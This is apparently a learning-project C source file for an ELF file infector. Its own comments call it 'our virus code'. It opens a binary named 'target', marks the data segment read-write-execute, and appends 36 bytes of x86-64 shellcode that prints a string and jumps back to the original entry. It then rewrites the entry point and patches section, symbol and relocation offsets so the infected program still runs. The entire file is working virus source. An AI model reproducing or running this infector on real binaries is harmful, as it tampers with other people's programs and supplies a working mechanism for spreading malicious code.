#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <elf.h>
#include <stdio.h>
#include <string.h>

char code2[40] = {
	0x52,0x48,0xb8,0x48,0x61,0x43,0x6b,0x65,0x44,0x0a,
	0x03,0x50,0x48,0x8d,0x34,0x24,0xb8,0x01,0x00,0x00,
	0x00,0xbf,0x01,0x00,0x00,0x00,0xba,0x07,0x00,0x00,
	0x00,0x0f,0x05,0x58,0x5a,0xe9
};

int codeLen = 36;

void	debug_code() {
	int i = 0;
	while (i < codeLen) {
		printf("%02x ", ((uint8_t *)&code2)[i]);
		i++;
	}
	printf("\n");
	return;
}

int		main(int argc, char **argv) {
	int		fd = open("target", O_RDWR);
	char	buffer[4096];
	char	buffer2[8192];
	int		structNum = 0;
	int		secOffset = 0;

	Elf64_Ehdr *Ehdr = NULL;
	Elf64_Phdr *Phdr = NULL;
	Elf64_Shdr *Shdr = NULL;
	Elf64_Sym  *Sthdr = NULL;
	Elf64_Rela *Rhdr = NULL;

	codeLen += 4; // FOR ADDR LATER

	// ENTRY HEADER
	read(fd, buffer, sizeof(Elf64_Ehdr));
	Ehdr = (Elf64_Ehdr *)buffer;
	structNum = Ehdr->e_phnum;
	printf("Entry point: %lx\n", Ehdr->e_entry);

	// SAVE SECTION INFORMATIONS FOR LATER
	uint64_t shdr_start = Ehdr->e_shoff;
	uint16_t shnum = Ehdr->e_shnum;
	uint64_t host_entry = Ehdr->e_entry;

	// INCREMENT SECTION OFFSET BY CODE LEN
	Ehdr->e_shoff += codeLen;
	lseek(fd, 0x28, SEEK_SET);
	write(fd, &Ehdr->e_shoff, sizeof(uint32_t));

	// PARSE SEGMENTS
	off_t phdr_start = lseek(fd, Ehdr->e_phoff, SEEK_SET);
	read(fd, buffer, sizeof(Elf64_Phdr) * structNum);

	int i = 0;
	uint64_t phdr_offset = 0;
	uint64_t injected_address = 0;
	uint64_t tmp = 0;

	while (i < structNum) {
		Phdr = (Elf64_Phdr *)buffer + i;
		phdr_offset = phdr_start + ((uint64_t)Phdr - (uint64_t)&buffer);
		//printf("Found segment number: %d at file offset: 0x%lx\n", i, Phdr->p_offset);
		// printf("Segment check %lx > %lx\n", Phdr->p_offset, injected_address);
		//printf("Tmp: %lx, Vaddr: %lx, Tmp+codeLen: %lx\n", tmp, Phdr->p_vaddr, tmp+codeLen);
		if (injected_address > 0) {
			/*printf("Incrementing Segment\n");*/
			/*Phdr->p_offset += codeLen;*/
			/*lseek(fd, phdr_offset + 4 + 4, SEEK_SET);*/
			/*write(fd, &Phdr->p_offset, sizeof(uint64_t));*/
			/*uint64_t new_addr = Phdr->p_vaddr + codeLen;*/
			/*lseek(fd, phdr_offset + 4 + 4 + 8, SEEK_SET);*/
			/*write(fd, &new_addr, sizeof(uint64_t));*/
		}
			// FOUND DATA SEGMENT
		if (Phdr->p_type == 1 && Phdr->p_flags == 6) {
			// printf("Found data segment at offset: 0x%lx\n", Phdr->p_offset);
			injected_address = Phdr->p_offset + Phdr->p_filesz;
			tmp = Phdr->p_vaddr + Phdr->p_filesz;
			// printf("End of data segment: 0x%lx\n", injected_address);

			// SET EXECUTE FLAG FOR DATA SEG
			size_t flag_offset = 4 + phdr_start + ((uint64_t)Phdr - (uint64_t)&buffer);
			lseek(fd, flag_offset, SEEK_SET);
			uint32_t RWE = 0x00000007;
			write(fd, &RWE, sizeof(uint32_t));

			// SET ENTRY POINT AT END OF DATA SEG
			lseek(fd, 0x18, SEEK_SET);
			printf("Set entry point: %lx\n", tmp);
			write(fd, &tmp, sizeof(uint64_t));

			// REDIRECT OUR VIRUS CODE TO HOST ENTRY POINT
			void *addr = &code2;
			addr += codeLen - 4;
			uint32_t difference = tmp - host_entry;
			printf("Difference = %x - %x = %x\n", tmp, host_entry, difference);
			difference += codeLen;
			difference *= -1; // FOR NEGATIVE REL JUMP
			*(uint32_t *)addr = difference;
			debug_code();

			// INCREASE DATA SEG SIZE, MEMSZ & FILESZ BY SIZE OF OUR VIRUS
			Phdr->p_filesz += codeLen;
			Phdr->p_memsz += codeLen;
			lseek(fd, flag_offset + 4 + 8 + 8 + 8, SEEK_SET);
			write(fd, &Phdr->p_filesz, sizeof(uint64_t));
			write(fd, &Phdr->p_memsz, sizeof(uint64_t));

			// APPEND CODE AT END DATA SEGMENT
			lseek(fd, injected_address, SEEK_SET);
			int j = 0;
			int end = read(fd, &buffer2, 8192);
			// debug_code();
			lseek(fd, injected_address, SEEK_SET);
			while (j < codeLen) {
				write(fd, &code2[j], 1);
				j++;
			}
			write(fd, buffer2, end);
			printf("Injected %d hex values at offset: 0x%lx\n", j, injected_address);
			printf("Writing %d bytes to reach EOF\n", end);
		}
		i++;
	}

	// PARSE SECTIONS TO INCREASE .bss SECTION OFFSET BY THE SIZE OF VIRUS
	shdr_start += codeLen;
	lseek(fd, shdr_start, SEEK_SET);
	read(fd, buffer, sizeof(Elf64_Shdr) * shnum);

	i = 0;
	int found = 0;
	uint64_t shdr_offset = 0;
	while (i < shnum) {
		Shdr = (Elf64_Shdr *)buffer + i;
		shdr_offset = shdr_start + ((uint64_t)Shdr - (uint64_t)&buffer);
		printf("Found section number: %d at file offset: 0x%lx\n", i, Shdr->sh_offset);
		printf("Type: %d\n", Shdr->sh_type);
		if (Shdr->sh_type == SHT_DYNSYM) {
			printf("Found .dynsym section\n");
			lseek(fd, Shdr->sh_offset, SEEK_SET);
			read(fd, buffer2, Shdr->sh_size);
			int j = 0;
			uint64_t sthdr_offset = 0;
			while (j * sizeof(Elf64_Sym) < Shdr->sh_size) {
				Sthdr = (Elf64_Sym *)buffer2 + j;
				sthdr_offset = Shdr->sh_offset + j * sizeof(Elf64_Sym);
				if (Sthdr->st_value >= tmp) {
					printf("st_value: %x\n", Sthdr->st_value);
					Sthdr->st_value += codeLen;
					lseek(fd, sthdr_offset + 4 + 1 + 1 + 2, SEEK_SET);
					write(fd, &Sthdr->st_value, sizeof(uint64_t));
				}
				j++;
			}
		}
		else if (Shdr->sh_type == SHT_RELA) {
			printf("Found rela section\n");
			lseek(fd, Shdr->sh_offset, SEEK_SET);
			read(fd, buffer2, Shdr->sh_size);
			int j = 0;
			uint64_t Rhdr_offset = 0;
			while (j * sizeof(Elf64_Rela) < Shdr->sh_size) {
				Rhdr = (Elf64_Rela *)buffer2 + j;
				Rhdr_offset = Shdr->sh_offset + j * sizeof(Elf64_Rela);
				if (Rhdr->r_offset >= tmp) {
					printf("r_offset: %x\n", Rhdr->r_offset);
					Rhdr->r_offset += codeLen;
					lseek(fd, Rhdr_offset, SEEK_SET);
					write(fd, &Rhdr->r_offset, sizeof(uint64_t));
				}
				j++;
			}
		}
		else if (Shdr->sh_type == SHT_NOBITS) {
			printf("Found .bss section\n");
			found = 1;
			// MUST CHANGE .data sh_flag to WAX ? (set bit SHF_EXECINSTR to 1) USELESS ?
			Shdr = (Elf64_Shdr *)buffer + (i - 1);
			Shdr->sh_size += codeLen;
			//Shdr->sh_flags = Shdr->sh_flags | SHF_EXECINSTR; // SETTING EXEC BIT<]
			uint64_t temp = shdr_start + ((uint64_t)Shdr - (uint64_t)&buffer);
			lseek(fd, temp + 4 + 4 + 8 + 8 + 8, SEEK_SET);
			write(fd, &Shdr->sh_size, sizeof(uint64_t));
			Shdr = (Elf64_Shdr *)buffer + i;
		}
		// printf("Section check %lx > %lx\n", Shdr->sh_addr, tmp);
		if (found) {
			printf("Incrementing section offset\n");
			Shdr->sh_addr += codeLen;
			lseek(fd, shdr_offset + 4 + 4 + 8, SEEK_SET);
			write(fd, &Shdr->sh_addr, sizeof(uint64_t));
			Shdr->sh_offset += codeLen;
			write(fd, &Shdr->sh_offset, sizeof(uint64_t));
		}
		i++;
	}
	close(fd);
	return 1;
}
